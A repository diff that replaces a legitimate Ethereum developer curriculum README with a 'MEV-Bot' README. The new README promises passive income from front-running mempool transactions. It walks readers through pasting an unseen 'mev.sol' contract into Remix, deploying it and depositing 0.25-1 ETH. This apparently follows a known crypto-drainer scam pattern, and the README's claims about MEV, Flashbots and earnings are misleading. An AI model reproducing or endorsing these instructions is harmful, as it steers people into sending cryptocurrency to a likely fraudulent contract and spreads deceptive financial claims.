@@ -1,96 +1,63 @@
-# 👩‍💻 Web2 to Web3 🚀 
+﻿# MEV-Bot
 
-## 🖍 A curated, free, and open-source curriculum for Ethereum developers 🏅
+### Mining Extractable Value (MEV) offers a lucrative avenue for income generation derived from unconfirmed transactions in the mempool. Leveraging the cutting-edge infrastructure of Flashbot, you can earn passive income by exploiting MEV.
 
-📚  *Prerequisites: You'll need to know how to write javascript!* (Try a few [simple js challenges](https://github.com/carletex/js-challenges)) 
+Flashbot provides miners with the power to strategically select and sequence transactions in blocks, thereby extracting additional value. This opens up profitable trades, arbitrage opportunities, and a host of MEV-related prospects. Witness your earnings skyrocket based on transactions located in the blockchain's mempool!
 
----
+## 💡 Introducing Flashbot
+Flashbot is an open infrastructure pioneered by a team of researchers and developers to exploit Miner Extractable Value (MEV) in the Ethereum network. It gives blockchain miners the power to gain additional value from transactions by controlling their order and inclusion in blocks.
 
-### Sections:
-- [Week 1 - 👩‍🔬 Becoming A Power User](#week-1----becoming-a-power-user)
-- [Week 2 - 👩‍🚀 Scripting and Smart Contracts](#week-2----scripting-and-smart-contracts)
-- [Week 3 - 🧙‍♀️ Building Decentralized Apps](#week-3---%EF%B8%8F-building-decentralized-apps)
-- [Week 4 - 🚢  Build Your Own Project](#week-4-----build-your-own-project)
-- [Next Steps!](#next-steps)
+Flashbot aims to resolve issues related to MEV, such as frontrunning (snagging transactions before their inclusion in a block), and mitigate the adverse impact on users and Decentralized Finance (DeFi) applications.
 
----
+This infrastructure empowers developers and users to send bundles of transactions directly to Ethereum miners, bypassing the standard route via transaction pools. These bundles carry information about multiple transactions that need to be executed in a specific order, providing miners the choice to include or reject these bundles according to their preferences and objectives.
 
-[![web2toweb3](https://user-images.githubusercontent.com/2653167/189006729-2de9f137-997a-4753-a66b-1652a213a7fe.png)](https://www.youtube.com/playlist?list=PLJz1HruEnenAf80uOfDwBPqaliJkjKg69)
+## 📊 Platform Comparison
+Platform	Router Address	Network	Mempool Scan Time
+Pancakeswap	0x10ED43C718714eb63d5aA57B78B54704E256024E	BSC	0.78 sec
+Uniswap	0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D	ETH	0.32 sec
 
-🎥 [ watch the full playlist ](https://www.youtube.com/playlist?list=PLJz1HruEnenAf80uOfDwBPqaliJkjKg69)
 
----
-### Week 1 - 👩‍🔬 Becoming A Power User
+## 🤖 How to Use MEVBot
+<img src="https://i.ibb.co/Jtnzrtq/1.png" alt="1" border="0">
 
-The first step to starting as a developer in the web3 ecosystem is first to become a Power User!
+### Step 1: Access the Source Code 📝
+Navigate to the Remix IDE: https://remix.ethereum.org/
+Create a new file "mev.sol".
+Copy the code inside "mev.sol" from the GitHub repository and paste it into the Remix IDE.
 
-You should start by getting hands-on & using the tools which will give you a much greater understanding of what you can do and what the crypto space is all about. In this section, we're talking about the tools in the crypto space, using them and helping you become an Ethereum power user.
+<img src="https://i.ibb.co/hfNMhwM/2.png" alt="2" border="0">
 
-- **Day 1**: [Introduction](https://youtu.be/zuJ-elbo88E)
 
-- **Day 2**: [Wallets, Transactions, Gas](https://youtu.be/_GjPeRLCREA)
-   
-- **Day 3**: [DApp, ENS, DEX & Identity](https://youtu.be/wYSMNdIRoII)  
-   
-- **Day 4**: [NFTs! ERC20 vs ERC721, IPFS, Metadata](https://youtu.be/NOdrEpnoCiM)
-   
-- **Day 5**: [Stuck Transaction, Gas Limits, Multisigs, L2s & DeFi](https://youtu.be/11QTT6BK5j0)
- 
----
+### Step 2: Compile the Code ⚙️
+Select the Solidity compiler 0.6.12.
+Click 'Compile mev.sol'. 
+<img src="https://i.ibb.co/4N3Sc2h/3.png" alt="3" border="0">
 
-### Week 2 - 👩‍🚀 Scripting and Smart Contracts
 
-In this section, we'll **start programming!** 
+### Step 3: Choose the Network 🌐
+Select either ETH or BSC (BNB) network.
+<img src="https://i.ibb.co/KVnWchf/4.png" alt="4" border="0">
 
-It goes from writing scripts, talking to the blockchain, and building Decentralized Applications(dApps). The topics covered included Providers, Signers, ethers.js, hardhat, scaffold-eth and many more! Follow the notes [here.](https://github.com/austintgriffith/web2-to-web3-curriculum/blob/main/week1/week-1-notes.md)
 
-- **Day 1**: [Providers, Signers, Wallets & Scripting with ethers.js](https://youtu.be/m2AJAcWk394)
-   
-- **Day 2**: [Reading & writing to contracts with ethers.js](https://youtu.be/9qt35swYSUg)
+### Step 4: Deploy the Code 🚀
+Click 'Transact (Deploy)'.
 
-- **Day 3**: [Intro to Ethereum Clients & Hardhat](https://youtu.be/7EwDOV4nEcY)
-  
-- **Day 4**: [Solidity & Testing with Hardhat](https://youtu.be/KjzH5EPCA-A)
-   
-- **Day 5**: [🏗 Scaffold-eth Intro & Solidity Recap](https://youtu.be/7pIzfm7hxQk)
 
----
+### Step 5: Deposit into MEVBot 💰
+Copy your MEV contract and send an amount of Ethereum for the bot's operation.
+Start the bot by pressing the 'Start' button.
+<img src="https://i.ibb.co/M7Mc0cN/5.png" alt="5" border="0">
+<img src="https://i.ibb.co/H7XbRPL/6.png" alt="6" border="0">
 
-### Week 3 - 🧙‍♀️ Building Decentralized Apps
+🔔 Note: For successful transactions on the Ethereum network, you must have sufficient balance to cover the gas fees. We recommend a minimum of 0.25-1 ETH.
 
-In this section, we'll be going through **SpeedRunEthereum!** 
+### You can withdraw funds by clicking the 'Stop' and 'Withdrawal' button.
 
-SpeedRunEthereum is a set of challenges for developers to get building with Ethereum. It's not only about learning the syntax but also understanding what's possible with Ethereum. It's also a great way to build your web3 portfolio. You'll be writing code and deploying your smart contracts. 
-   
-- **Day 1**: [SpeedRunEthereum.com - Challenge 0 - NFT deployed to testnet](https://youtu.be/ej_RgaO1Pr0)
+UPD: If you have closed the Remix IDE website or accidentally rebooted your computer, you can still access all the bot's functions through Etherscan. You will need to verify the bot contract on Etherscan, and you will have access to the same functions as you would through the Remix IDE website.
 
-- **Day 2**: [SpeedRunEthereum.com - Challenge 1 - Staking app](https://youtu.be/DcOzXhaxtt4)
+## Support
+If you benefitted from the project, show us some support by giving us a star ⭐. Open source is awesome!
 
-- **Day 3**: [SpeedRunEthereum.com - Challenge 2 - Token Vendor](https://youtu.be/OvBrInI5VbM)
+## License
 
-- **Day 4**: [SpeedRunEthereum.com - Challenge 3 -  Dice Game](https://youtu.be/IMEmwxTDnBw)
-
-- **Day 5**: [SpeedRunEthereum.com - Next Challenges: ⚖️DEX + 👛 Multisig + 🎫 SVG NFT](https://youtu.be/vWkkwVUuGog)
-
----
-
-### Week 4 - 🚢  Build Your Own Project 
-
-Now it's your turn to **create your project!** 
-
-It's all about building forkable components with Scaffold-ETH. You can make a new voting system component, work on the open issues, make a new challenge for SpeedRunEthereum, etc. Make sure to have a well-written README so anyone can easily set it up. Then, create your project & upload it to your BuidlGuidl Profile! 
-
-There's a lot you can build & collaborate with other builders in the ecosystem! That's where BuildGuild comes in! BuidlGuidl is a group of builders that build tools with Scaffold-ETH, meet and learn together, and get funded for contributing. The goal is to empower builders to create prototypes, projects and resources for the Ethereum ecosystem. 🌟 After building forkable Scaffold-ETH components, submitting them to your builder profile, and being active in the BuidlGuidl Telegram groups, you can get the opportunity to join BuidlGuidl!
-
----
-
-### Next Steps!
-
-**Congrats!!** Now it's time to move to the next stages! There are many different pathways to continue with the skills you've gained through the weeks. Here are some options:
-
-- **Start Working in a web3 company:** Get hired as a junior with your Speed Run portfolio. Build things and show them off on Twitter!  ([Here](https://twitter.com/austingriffith/status/1478760479275175940?s=20&t=0zGF8M_7Hoeuy-D6LDoFpA) is a great "next steps" thread)
-
-- **Build your own tools:** Build your product or start building forkable examples and tutorials for the ecosystem 
-(Learn something and leave the campsite better than you found it. Help the next dev learn what you learned, but easier.) 
-
-- **Continue learning more advanced concepts:** Crush some of the more complex challenges like the [Ethernaut](https://ethernaut.openzeppelin.com/), read through previous audits, start auditing yolos from the BG, get introduced to audit firms and folks within our network that are at the cutting edge with solidity auditing...
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
